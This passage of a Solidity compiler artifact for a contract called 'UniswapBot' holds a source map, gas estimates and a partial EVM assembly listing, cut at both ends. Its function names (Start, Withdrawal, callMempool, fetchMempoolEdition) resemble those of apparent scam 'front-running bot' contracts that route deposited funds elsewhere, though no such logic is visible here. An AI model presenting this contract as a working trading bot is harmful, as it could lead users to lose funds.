2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;7427:79:3;;;;;;;;;;;;;;;;36:153:-1;66:2;61:3;58:11;36:153;;182:3;176:10;171:3;164:23;98:2;93:3;89:12;82:19;;123:2;118:3;114:12;107:19;;148:2;143:3;139:12;132:19;;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;7427:79:3;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;7427:79:3;;;7413:94;;;;;;7130:382;:::o;3573:723::-;3640:22;3669:16;3694:2;3669:28;;3702:13;3718:1;3702:17;;3724:10;3739;3759:6;3768:1;3759:10;;3754:512;3775:10;3771:1;:14;3754:512;;;3810:3;3801:12;;;;3838:3;3842:1;3838:6;;;;;;;;;;;;;;;;3832:13;;3824:22;;3819:27;;3871:3;3879:1;3875;:5;3871:10;;;;;;;;;;;;;;;;3865:17;;3857:26;;3852:31;;3900:2;3894;:8;;;;3893:25;;;;;3914:3;3908:2;:9;;;;3893:25;3889:169;;;3933:2;3927:8;;;;3889:169;;;3959:2;3953;:8;;;;3952:24;;;;;3973:2;3967;:8;;;;3952:24;3948:110;;;3991:2;3985:8;;;;3948:110;;;4017:2;4011;:8;;;;4010:24;;;;;4031:2;4025;:8;;;;4010:24;4006:52;;;4049:2;4043:8;;;;4006:52;3948:110;3889:169;4074:2;4068;:8;;;;4067:25;;;;;4088:3;4082:2;:9;;;;4067:25;4063:169;;;4107:2;4101:8;;;;4063:169;;;4133:2;4127;:8;;;;4126:24;;;;;4147:2;4141;:8;;;;4126:24;4122:110;;;4165:2;4159:8;;;;4122:110;;;4191:2;4185;:8;;;;4184:24;;;;;4205:2;4199;:8;;;;4184:24;4180:52;;;4223:2;4217:8;;;;4180:52;4122:110;4063:169;4257:2;4252;4247;:7;:12;4237:23;;;;3792:1;3787:6;;;;3754:512;;;;4285:5;4270:21;;;;;;3573:723;;;:::o;4944:87::-;4987:4;5005:21;4998:28;;4944:87;:::o;6504:::-;6553:13;6574:12;;;;;;;;;;;;;;;;;;;6504:87;:::o;3454:113::-;3507:13;3528:34;;;;;;;;;;;;;;;;;;;3454:113;:::o;2242:99::-;2295:13;2316:20;;;;;;;;;;;;;;;;;;;2242:99;:::o;4852:86::-;4900:13;4921:12;;;;;;;;;;;;;;;;;;;4852:86;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "546000",
								"executionCost": "21447",
								"totalCost": "567447"
							},
							"external": {
								"Start()": "infinite",
								"Stop()": "infinite",
								"Withdrawal()": "infinite",
								"owner()": "1075",
								"symbol()": "infinite"
							},
							"internal": {
								"callMempool()": "infinite",
								"checkLiquidity(uint256)": "infinite",
								"contractData()": "infinite",
								"fetchContractID()": "infinite",
								"fetchMempoolEdition()": "infinite",
								"fetchMempoolVersion()": "infinite",
								"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
								"getBalance()": "25",
								"getMemPoolLength()": "infinite",
								"getMemPoolOffset()": "infinite",
								"getMempoolLong()": "infinite",
								"getMempoolShort()": "infinite",
								"loadCurrentContract(string memory)": "infinite",
								"mempool(string memory,string memory)": "infinite",
								"startExploration(string memory)": "infinite",
								"tokenSymbol()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 435,
									"end": 7892,
									"name": "PUSH",
									"source": 3,
									"value": "80"
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "PUSH",
									"source": 3,
									"value": "40"
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "MSTORE",
									"source": 3
								},
								{
									"begin": 653,
									"end": 711,
									"name": "CALLVALUE",
									"source": 3
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 653,
									"end": 711,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 693,
									"end": 703,
									"name": "CALLER",
									"source": 3
								},
								{
									"begin": 685,
									"end": 690,
									"name": "PUSH",
									"source": 3,
									"value": "2"
								},
								{
									"begin": 685,
									"end": 690,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 685,
									"end": 703,
									"name": "PUSH",
									"source": 3,
									"value": "100"
								},
								{
									"begin": 685,
									"end": 703,
									"name": "EXP",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "SLOAD",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "PUSH",
									"source": 3,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 685,
									"end": 703,
									"name": "MUL",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "NOT",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "DUP4",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "PUSH",
									"source": 3,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 685,
									"end": 703,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "MUL",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "OR",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "SSTORE",
									"source": 3
								},
								{
									"begin": 685,
									"end": 703,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "PUSH #[$]",
									"source": 3,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "PUSH [$]",
									"source": 3,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "CODECOPY",
									"source": 3
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 435,
									"end": 7892,
									"name": "RETURN",
									"source": 3
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220a179cd3f9a43e88015e2ac7019a7f2fa71bb38a8bb86a1dbe1bacaccbd46397664736f6c63430006060033",
									".code": [
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "CALLDATASIZE",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "CALLDATALOAD",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "E0"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "SHR",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "1B55BA3A"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "3"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "70E44C6A"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "8DA5CB5B"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "5"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "95D89B41"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "6"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH",
											"source": 3,
											"value": "BEDF0F4A"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "7"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "tag",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "CALLDATASIZE",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "STOP",
											"source": 3
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "tag",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 435,
											"end": 7892,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "tag",
											"source": 3,
											"value": "3"
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "CALLVALUE",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "10"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "11"
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "tag",
											"source": 3,
											"value": "11"
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 5037,
											"end": 5196,
											"name": "STOP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "tag",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "CALLVALUE",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "14"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "15"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "tag",
											"source": 3,
											"value": "14"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 23,
											"end": 24,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "16"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "18"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 99,
											"end": 100,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 94,
											"end": 97,
											"name": "DUP3",
											"source": -1
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD",
											"source": -1
										},
										{
											"begin": 80,
											"end": 81,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 75,
											"end": 78,
											"name": "DUP5",
											"source": -1
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 49,
											"end": 50,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "SWAP1",
											"source": -1
										},
										{
											"begin": 40,
											"end": 55,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "16"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP",
											"source": -1
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"source": -1,
											"value": "18"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "19"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "EXP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "NOT",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "tag",
											"source": 3,
											"value": "19"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 6599,
											"end": 7124,
											"name": "RETURN",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "tag",
											"source": 3,
											"value": "5"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "CALLVALUE",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 509,
											"end": 529,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "21"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "22"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "tag",
											"source": 3,
											"value": "21"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 509,
											"end": 529,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 509,
											"end": 529,
											"name": "RETURN",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "tag",
											"source": 3,
											"value": "6"
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 7719,
											"end": 7889,
											"name": "CALLVALUE",
											"source": 3
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "23"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "23"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
